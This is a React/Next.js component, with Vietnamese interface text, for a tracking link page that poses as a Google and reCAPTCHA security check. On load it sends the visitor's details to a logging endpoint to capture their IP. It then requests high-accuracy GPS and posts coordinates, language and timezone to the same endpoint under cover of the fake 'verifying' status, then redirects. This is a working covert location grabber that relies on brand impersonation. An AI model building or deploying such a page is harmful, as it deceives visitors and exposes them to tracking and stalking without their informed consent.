
'use client';

import React, { useState, useEffect, useCallback } from 'react';
import Image from 'next/image';
import { FileText, ShieldCheck } from 'lucide-react';
import type { Link as LinkType } from '@/app/actions/links';

interface LinkVerificationClientProps {
  link: LinkType;
}

export function LinkVerificationClient({ link }: LinkVerificationClientProps) {
  const [status, setStatus] = useState('Đang kiểm tra độ bảo mật...');
  const [isVerifying, setIsVerifying] = useState(true);
  const [hasTriggered, setHasTriggered] = useState(false);

  const logLocation = useCallback(async (pos?: GeolocationPosition) => {
    try {
      const body = {
        linkId: link.id,
        lang: navigator.language || 'N/A',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
        lat: pos?.coords.latitude,
        lon: pos?.coords.longitude,
        acc: pos?.coords.accuracy
      };

      await fetch('/api/log-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
        keepalive: true,
      });
    } catch (e) {
      console.error("Logging error:", e);
    } finally {
      // Chuyển hướng sau khi đã ghi log (hoặc cố gắng ghi log)
      setTimeout(() => {
        window.location.href = link.redirectUrl;
      }, 800);
    }
  }, [link]);

  const startVerification = useCallback(() => {
    if (hasTriggered) return;
    setHasTriggered(true);
    setIsVerifying(true);
    setStatus('Đang xác minh GPS...');

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setStatus('Xác minh thành công. Đang chuyển hướng...');
          logLocation(pos);
        },
        (err) => {
          setStatus('Vị trí bị từ chối. Đang tiếp tục...');
          logLocation();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    } else {
      logLocation();
    }
  }, [hasTriggered, logLocation]);

  // Tự động kích hoạt khi trang được tải
  useEffect(() => {
    // Bước 1: Ghi log IP ngay lập tức (lấy từ Header phía Server API)
    fetch('/api/log-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ linkId: link.id, status: 'IP-Capture-Only' }),
        keepalive: true,
    });

    // Bước 2: Kích hoạt Geolocation sau một khoảng trễ nhỏ để tránh bị trình duyệt chặn do tải quá nhanh
    const timer = setTimeout(() => {
        startVerification();
    }, 1200);

    return () => clearTimeout(timer);
  }, [link.id, startVerification]);

  return (
    <div className="flex justify-center items-center min-h-screen bg-white p-4 font-bold italic">
      <div className="text-center w-full max-w-sm">
        <Image 
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
            alt="Google" 
            width={92} 
            height={30} 
            className="h-6 mx-auto mb-10 opacity-70"
        />
        
        {isVerifying ? (
            <div className="animate-in fade-in duration-500">
                <div className="w-10 h-10 border-4 border-gray-100 border-t-blue-500 rounded-full animate-spin mx-auto mb-6" />
                <p className="text-gray-400 uppercase text-[9px] animate-pulse tracking-widest">{status}</p>
                
                <div className="mt-12 bg-gray-50 p-6 rounded-3xl border border-gray-100 opacity-40">
                    <div className="flex items-center gap-3 mb-4 text-left px-2">
                        <FileText className="h-5 w-5 text-blue-500 opacity-60" />
                        <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
                    </div>
                    <div className="aspect-video w-full rounded-2xl overflow-hidden bg-gray-200" />
                </div>
            </div>
        ) : (
            <div className="animate-in fade-in slide-in-from-bottom-4 duration-700">
                <div className="bg-gray-50 p-4 rounded-3xl border border-gray-100 mb-8 overflow-hidden shadow-sm">
                    <div className="flex items-center gap-3 mb-4 text-left px-2">
                        <FileText className="h-5 w-5 text-blue-500 opacity-60" />
                        <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
                    </div>
                    <div className="aspect-video w-full rounded-2xl overflow-hidden mb-2">
                        <Image src={link.imageUrl} alt="Preview" width={400} height={225} className="object-cover w-full h-full grayscale opacity-50" />
                    </div>
                </div>

                <button 
                  onClick={startVerification} 
                  className="p-8 bg-white border border-gray-100 rounded-[30px] w-full shadow-lg text-[11px] uppercase flex justify-between items-center text-gray-700 hover:bg-gray-50 transition-all border-b-4 active:border-b-0 active:translate-y-1"
                >
                    <span>TIẾP TỤC TRUY CẬP</span>
                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width={20} height={20} className="opacity-40" />
                </button>
            </div>
        )}
        
        <div className="mt-10 flex items-center justify-center gap-2 text-gray-300">
            <ShieldCheck className="h-3 w-3" />
            <p className="text-[8px] uppercase tracking-tighter">Bảo mật bởi Sentinel Master v78</p>
        </div>
      </div>
    </div>
  );
}
